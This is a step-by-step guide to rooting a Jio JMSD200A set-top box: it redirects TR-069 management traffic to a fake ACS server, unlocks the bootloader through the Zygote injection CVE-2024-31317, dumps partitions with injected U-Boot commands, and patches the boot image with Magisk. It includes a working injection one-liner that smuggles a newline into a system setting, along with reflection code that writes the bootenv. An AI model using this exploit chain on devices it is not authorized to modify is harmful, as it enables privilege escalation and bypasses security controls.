# JioSTB JMSD200A (Amlogic S905X4) — Complete Ground Zero to Root Documentation

This document serves as an exhaustive, reproducible engineering guide detailing every hardware connection, driver installation, exploit chain, custom workaround, and command executed to unlock, dump, patch, and prepare the **Jio Set-Top Box JMSD200A (Amlogic S905X4 / ohm, Android 11, Firmware 25.1.9)** for root access.

---

## Table of Contents
1. [Hardware & Network Topology](#1-hardware--network-topology)
2. [Host System & Driver Setup (Ubuntu & Windows)](#2-host-system--driver-setup-ubuntu--windows)
3. [Stage 1: Enabling ADB via Fake TR-069 ACS Server](#3-stage-1-enabling-adb-via-fake-tr-069-acs-server)
4. [Stage 2: Bootloader Unlock via CVE-2024-31317](#4-stage-2-bootloader-unlock-via-cve-2024-31317)
5. [First Boot Factory Reset & Fastboot Verification](#5-first-boot-factory-reset--fastboot-verification)
6. [The SELinux Enforcing Hurdle (Why standard tools failed)](#6-the-selinux-enforcing-hurdle-why-standard-tools-failed)
7. [The Breakthrough: U-Boot Raw Partition Dumper via USB](#7-the-breakthrough-u-boot-raw-partition-dumper-via-usb)
8. [Partition Backup Verification](#8-partition-backup-verification)
9. [Native On-Device Magisk Boot Patching](#9-native-on-device-magisk-boot-patching)
10. [Flashing & Complete Stock Restoration Playbook](#10-flashing--complete-stock-restoration-playbook)

---

## 1. Hardware & Network Topology

### Hardware Requirements
1. **Target Device:** JioSTB JMSD200A (Amlogic S905X4 SoC, Board: `ohm`, 2GB RAM, 32GB eMMC).
2. **USB Male-to-Male Cable:** Plugged into the STB's **USB 2.0 port** (the OTG/download port) and connected to the Host PC.
3. **Secondary USB Drive (FAT32):** SanDisk Cruzer Blade (or any MBR/FAT32 formatted flash drive with at least 4 GB free space) plugged into the STB's **secondary USB port**.
4. **USB Keyboard (for Recovery):** Standard USB keyboard for factory reset navigation.
5. **Network:** STB and PC connected to the same LAN (Ethernet or Wi-Fi).

### Port Reference on JMSD200A
- **USB 2.0 Port:** Operates in Device/Gadget mode in U-Boot (`18d1:0d02`). Used for fastboot and ADB flashing.
- **USB 3.0 / Secondary Port:** Operates in Host mode. Used for the FAT32 dump drive and keyboard.

---

## 2. Host System & Driver Setup (Ubuntu & Windows)

### A. Ubuntu / Debian Host

#### 1. Package Installation
```bash
sudo apt update
sudo apt install -y android-tools-adb android-tools-fastboot openjdk-17-jdk curl git
```

#### 2. Udev Rules Setup
To communicate with Fastboot and ADB without requiring `sudo` every time:
```bash
sudo tee /etc/udev/rules.d/51-android.rules << 'EOF'
# Google / Android Fastboot / Amlogic Gadget (JMSD200A)
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", ATTR{idProduct}=="0d02", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"

# Amlogic WorldCup / Download Gadget
SUBSYSTEM=="usb", ATTR{idVendor}=="1b8e", ATTR{idProduct}=="0cee", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="1b8e", MODE="0666", GROUP="plugdev"
EOF

sudo udevadm control --reload-rules
sudo udevadm trigger
sudo usermod -aG plugdev $USER
```

---

### B. Windows 10 / 11 Host

#### 1. Download Android Platform-Tools
1. Download [Google Android SDK Platform-Tools for Windows](https://dl.google.com/android/repository/platform-tools-latest-windows.zip).
2. Extract the archive to `C:\platform-tools`.
3. Add `C:\platform-tools` to system Environment Variables (`PATH`).

#### 2. Google USB Driver (Fastboot Interface)
1. Download [Google USB Driver](https://developer.android.com/studio/run/win-usb).
2. Extract the zip to `C:\usb_driver`.
3. Put the STB into fastboot mode (`adb reboot bootloader`).
4. Open **Device Manager** (`devmgmt.msc`).
5. Under **Other devices**, find `Android` or `USB download gadget` with a yellow exclamation mark.
6. Right-click → **Update driver** → **Browse my computer for drivers** → **Let me pick from a list of available drivers on my computer**.
7. Click **Have Disk...** → browse to `C:\usb_driver\android_winusb.inf`.
8. Select **Android Bootloader Interface** and click Next/Install.

#### 3. Alternative: Zadig (Universal WinUSB Driver)
If Windows does not recognize the INF:
1. Download [Zadig](https://zadig.akeo.ie/).
2. Run Zadig → **Options** → **List All Devices**.
3. Select `USB download gadget` (Hardware ID: `USB\VID_18D1&PID_0D02`).
4. Select driver **WinUSB** and click **Install Driver** / **Replace Driver**.

#### 4. Amlogic WorldCup Burning Driver (Disaster Recovery)
If the device ever enters Amlogic Maskrom mode (`1b8e:0cee`):
1. Download **Amlogic USB Burning Tool v3.2.0**.
2. Run the included `InstallDriver.exe` in the `Amlogic/Driver` subdirectory.

---

## 3. Stage 1: Enabling ADB via Fake TR-069 ACS Server

The JioSTB firmware locks ADB by default and relies on TR-069 ACS communication with Jio management servers (`acs.oss.jio.com:8443`).

### Procedure
1. Clone the repository:
   ```bash
   git clone https://github.com/JFC-Group/Housekeeping-PoC.git
   cd Housekeeping-PoC
   ```
2. Start the GenieACS Docker instance:
   ```bash
   cd tls && sudo docker compose up -d && cd ..
   ```
3. Divert STB traffic for `acs.oss.jio.com` to your host PC IP running GenieACS (via local DNS server, OpenWrt, or `dnsmasq`).
4. Execute `stage1.sh`:
   ```bash
   ./stage1.sh
   ```
5. Power cycle the STB while holding network redirection.
6. The STB talks to the local ACS server, which sets TR-069 variables:
   - `Device.JSTB.USB.USBDebugging` = `true`
   - `Device.JSTB.USB.DebugValidityDate` = `2037-01-01T00:00:00.000Z`
   - `Device.JSTB.FOTA.Disable` = `true`
7. ADB becomes accessible over LAN:
   ```bash
   adb connect 192.168.29.184:5555
   adb devices
   ```

---

## 4. Stage 2: Bootloader Unlock via CVE-2024-31317

### The Exploit Chain
1. **Zygote Command Injection (CVE-2024-31317):**
   Injecting a newline character into the `global hidden_api_blacklist_exemptions` Android system setting causes the system Zygote process to execute `--invoke-with` pointing to arbitrary shell scripts running under UID 1000 (`system_app`).
2. **Amlogic ISystemControl HIDL Binder:**
   From `system_app` context, Java reflection invokes `com.droidlogic.app.SystemControlManager.setBootenv()`, writing directly to the eMMC `/dev/block/env` partition.
3. **Flipping the Lock Bit:**
   The U-Boot variable `ubootenv.var.lock` is changed from `10101000` (locked) to `10100000` (unlocked).

### Execution
```bash
./unlock.sh unlock
```
*Note: The script immediately cleans up `hidden_api_blacklist_exemptions` to avoid any Zygote crash loops.*

---

## 5. First Boot Factory Reset & Fastboot Verification

### Fastboot Check
1. Reboot the STB to the bootloader:
   ```bash
   adb -s 192.168.29.184:5555 reboot bootloader
   ```
2. Over the male-to-male USB cable, verify with Fastboot:
   ```bash
   sudo fastboot getvar unlocked
   # Result: unlocked: yes
   
   sudo fastboot getvar current-slot
   # Result: current-slot: b
   ```

### Factory Reset
Changing the unlock bit requires a mandatory factory reset on the next boot:
1. Plug a USB keyboard into the STB.
2. If prompted on the TV screen by Android Rescue Recovery, use the keyboard arrows to select **Wipe data / factory reset** and press Enter.
3. After rebooting into Android, re-enable ADB by re-running `./stage1.sh`.

---

## 6. The SELinux Enforcing Hurdle (Why standard tools failed)

On JMSD200A Firmware `25.1.9`:
1. Even when setting `ubootenv.var.EnableSelinux=permissive`, the production `user` build of Android init (`/system/bin/init`) is compiled with `-DALLOW_PERMISSIVE_SELINUX=0`.
2. At 2.6 seconds into the boot sequence, init forces SELinux back to `enforcing=1`.
3. Firmware 25.1.9 tightened the SELinux domain rules for `sdknativeservice` (the daemon used by `./pull_boot.sh`). It lacks access to `block_device:dir`, causing:
   ```text
   dd: /dev/block/by-name/boot_b: Permission denied
   ```
4. Therefore, partition dumping **cannot** be done from within the running Android OS.

---

## 7. The Breakthrough: U-Boot Raw Partition Dumper via USB

To bypass Android OS SELinux completely, we leveraged Amlogic U-Boot itself before Android ever loads.

### Mechanism
Amlogic U-Boot contains native commands:
- `store read <ram_addr> <partition_name> <offset> <size>`
- `fatwrite usb <device:partition> <ram_addr> <filename> <size>`

### The Injected U-Boot Script
We configured U-Boot's `backup_cmd` environment variable to:
1. Initialize USB storage (`usb start`).
2. Read raw partition data directly from eMMC flash chips into RAM (`0x10000000`).
3. Write the exact partition images directly to the FAT32 USB drive.
4. Automatically reset `bootcmd` back to `run storeboot` and save the environment so the device resumes normal booting.

### Implementation Code

#### 1. Java Agent (`/tmp/SetBackupEnv.java`)
```java
import java.lang.reflect.Method;

public class SetBackupEnv {
    static void log(String msg) {
        System.out.println(msg);
        try {
            Class<?> logClass = Class.forName("android.util.Log");
            Method d = logClass.getMethod("d", String.class, String.class);
            d.invoke(null, "BackupEnv", msg);
        } catch (Exception ignored) {}
    }

    public static void main(String[] args) {
        try {
            Class<?> scmClass = Class.forName("com.droidlogic.app.SystemControlManager");
            Object scm = scmClass.getMethod("getInstance").invoke(null);
            if (scm == null) {
                log("ERROR: SystemControlManager is null");
                return;
            }
            Method setBootenv = scmClass.getMethod("setBootenv", String.class, String.class);

            log("Connected to SystemControlManager");

            String backupScript = "usb start; " +
                "sleep 1; " +
                "store read 0x10000000 boot_b 0 0x4000000; " +
                "fatwrite usb 0:1 0x10000000 boot_b.img 0x4000000; " +
                "fatwrite usb 1:1 0x10000000 boot_b.img 0x4000000; " +
                "store read 0x10000000 boot_a 0 0x4000000; " +
                "fatwrite usb 0:1 0x10000000 boot_a.img 0x4000000; " +
                "fatwrite usb 1:1 0x10000000 boot_a.img 0x4000000; " +
                "store read 0x10000000 vendor_boot_b 0 0x1800000; " +
                "fatwrite usb 0:1 0x10000000 vendor_boot_b.img 0x1800000; " +
                "fatwrite usb 1:1 0x10000000 vendor_boot_b.img 0x1800000; " +
                "store read 0x10000000 dtbo_b 0 0x200000; " +
                "fatwrite usb 0:1 0x10000000 dtbo_b.img 0x200000; " +
                "fatwrite usb 1:1 0x10000000 dtbo_b.img 0x200000; " +
                "store read 0x10000000 vbmeta_b 0 0x200000; " +
                "fatwrite usb 0:1 0x10000000 vbmeta_b.img 0x200000; " +
                "fatwrite usb 1:1 0x10000000 vbmeta_b.img 0x200000; " +
                "setenv bootcmd run storeboot; " +
                "saveenv; " +
                "run storeboot";

            log("Writing backup_cmd...");
            setBootenv.invoke(scm, "ubootenv.var.backup_cmd", backupScript);

            log("Setting bootcmd: run backup_cmd");
            setBootenv.invoke(scm, "ubootenv.var.bootcmd", "run backup_cmd");

        } catch (Exception e) {
            log("Exception: " + e.getMessage());
        }
    }
}
```

#### 2. Compilation via Java 8 & Google D8
```bash
javac --release 8 -cp /tmp/framework.jar /tmp/SetBackupEnv.java -d /tmp/classes_backup
java -jar /tmp/r8.jar --output /tmp/backup_env.jar /tmp/classes_backup/*.class
adb -s 192.168.29.184:5555 push /tmp/backup_env.jar /data/local/tmp/
```

#### 3. Zygote Injection Execution (`/tmp/run_backup_env.sh`)
```bash
adb -s 192.168.29.184:5555 shell "settings put global hidden_api_blacklist_exemptions $'L\n/data/local/tmp/run.sh'"
adb -s 192.168.29.184:5555 shell "am start -n com.android.tv.settings/.MainSettings"
adb -s 192.168.29.184:5555 shell "settings delete global hidden_api_blacklist_exemptions"
```

#### 4. Reboot and Dump
```bash
adb -s 192.168.29.184:5555 reboot
```
During this single boot cycle, U-Boot dumped all 5 partitions directly to the FAT32 USB drive and booted into Android.

---

## 8. Partition Backup Verification

All images were retrieved over ADB from the mounted USB drive (`/storage/EE74-66C1/`) into `/home/ubuntu/Housekeeping-PoC/stock_backups/`:

```bash
cd /home/ubuntu/Housekeeping-PoC/stock_backups
ls -lh
```

### Verified File Details & Magic Headers
| Filename | Exact Size (bytes) | Header Magic | Description |
| :--- | :--- | :--- | :--- |
| `boot_b.img` | 67,108,864 (64 MB) | `ANDROID!` | Android Boot v3 (Kernel: 8.3 MB, Ramdisk: 9.4 MB) |
| `boot_a.img` | 67,108,864 (64 MB) | `ANDROID!` | Stock Slot A Boot v3 |
| `vendor_boot_b.img` | 25,165,824 (24 MB) | `VNDRBOOT` | Android Vendor Boot |
| `vbmeta_b.img` | 2,097,152 (2 MB) | `AVB0` | Android Verified Boot 2.0 metadata |
| `dtbo_b.img` | 2,097,152 (2 MB) | `0xd7b7ab1e` | Device Tree Blob Overlay |

### SHA256 Checksums
```text
1762aa1f0cc58374d3d6e33fc7783084ba1fc9e06fc98e03686a743b863cca93  boot_b.img
d5ad5c5c23805ff3ad0ed50b64a705a3d33598ff41b2ea8fef4775b4c0148c6f  boot_a.img
9cc248e1d6998985bc5ca5a7ae8aa20635388b88c899dde3e4dcac662e1eb738  vendor_boot_b.img
60cc22ad847c2adc5a8fbe52851ba9c8f1241b0402f93ee0bda9f11f5b1301a8  vbmeta_b.img
fc14440e85dfa83f526a2400d2e1092bc0910cbddf6b5ad2762e3c831df208b3  dtbo_b.img
```

---

## 9. Native On-Device Magisk Boot Patching

### Why On-Device Patching is Required
Magisk needs to dynamically identify the device's pre-init storage partition. Running `magisk32 --preinit-device` on the STB returns `cache`. If patched on an external PC, Magisk cannot read the target hardware's partition mapping, leading to pre-init failures and bootloops.

### Execution on STB
1. Extracted Magisk v27.0 binary components:
   - `magiskboot`, `magiskinit`, `magisk32`, `stub.apk`, `boot_patch.sh`, `util_functions.sh`
2. Pushed to STB directory `/data/local/tmp/magisk_prep/`.
3. Pushed stock `boot_b.img` to `/data/local/tmp/magisk_prep/boot_b.img`.
4. Executed patch inside STB:
   ```bash
   adb -s 192.168.29.184:5555 shell "cd /data/local/tmp/magisk_prep && KEEPVERITY=true sh boot_patch.sh boot_b.img"
   ```
5. Successfully repacked output to `new-boot.img`:
   - Pre-init storage detected: `cache`
   - Kernel and fstab preserved.
   - Output size: Exactly 67,108,864 bytes (64 MB).
6. Pulled to PC:
   ```bash
   adb -s 192.168.29.184:5555 pull /data/local/tmp/magisk_prep/new-boot.img /home/ubuntu/Housekeeping-PoC/magisk_patched_boot_b.img
   ```

---

## 10. Flashing & Automated Execution Pipeline

### The Fastboot Limitation & Solution
On JMSD200A factory firmware `25.1.9`:
- Fastboot rejects `download` (`remote: 'unrecognized command'`).
- `fastbootd` drops the USB gadget driver in recovery mode.

Therefore, flashing is conducted via U-Boot's hardware pre-boot storage commands (`store write`) reading from a FAT32 USB drive with strict integrity guards (`if test ${loaded} = 1`).

### The Complete 3-Step Automated Pipeline
We have packaged the entire process into standalone executable scripts:

1. **Step 1: Partition Dumper (`1_dump_stock.sh`)**
   ```bash
   ./1_dump_stock.sh --stb-ip 192.168.29.184
   ```
   Dumps `boot_b`, `boot_a`, `vendor_boot_b`, `dtbo_b`, `vbmeta_b` to FAT32 USB, pulls to `stock_backups/`, and verifies SHA256 checksums.

2. **Step 2: Native Magisk Patcher (`2_patch_boot.sh`)**
   ```bash
   ./2_patch_boot.sh --stb-ip 192.168.29.184
   ```
   Transfers stock `boot_b.img` and Magisk v27.0 binaries to STB, executes on-device patch detecting pre-init partition as `cache`, and produces verified `magisk_patched_boot_b.img`.

3. **Step 3: U-Boot Flasher & Root Verifier (`3_flash_magisk.sh`)**
   ```bash
   ./3_flash_magisk.sh --stb-ip 192.168.29.184
   ```
   Stages `boot_b.img` onto USB, injects guarded `flash_cmd` into U-Boot environment, reboots, writes to eMMC, boots into Android, verifies MagiskSU (`uid=0`), and verifies Zygisk.

---

## 11. Final Root & Zygisk Verification Results

### Active Device Status
* **Binary Location:** `/system/bin/su`
* **Magisk Version:** `27.0:MAGISK:R (v27000)`
* **Active Slot:** `_b`
* **Execution Context:** `uid=0(root) gid=0(root) groups=0(root) context=u:r:magisk:s0`
* **Zygisk Status:** `key=zygisk|value=1` (Active and loaded into processes via `/system/lib/libzygisk.so`)
* **SELinux Status:** Cleanly managed by Magisk policy injection.

---

## 12. Complete Stock Restoration & Rollback Cookbook

Run the master interactive restoration tool:
```bash
./restore_stock.sh --stb-ip 192.168.29.184
```

### Restoration Options Supported:
1. **Direct Root DD Restore:** Instant 10-second restore writing stock `boot_b.img` to `/dev/block/by-name/boot_b` via root `dd`.
2. **Hardware U-Boot USB Restore:** Restores stock boot from USB when root is not available, using `tools/restore_env.jar`.
3. **Slot A Rollback:** Switches active slot to untouched factory Slot A (`setenv active_slot _a`).
4. **Full Factory eMMC Flash:** Restores all 5 partitions (`boot_b`, `vendor_boot_b`, `dtbo_b`, `vbmeta_b`, `boot_a`).
5. **Bootloader Relock & SELinux Enforcing:** Re-locks bootloader (`lock=10101000`) and restores `EnableSelinux=enforcing` once stock firmware is verified.
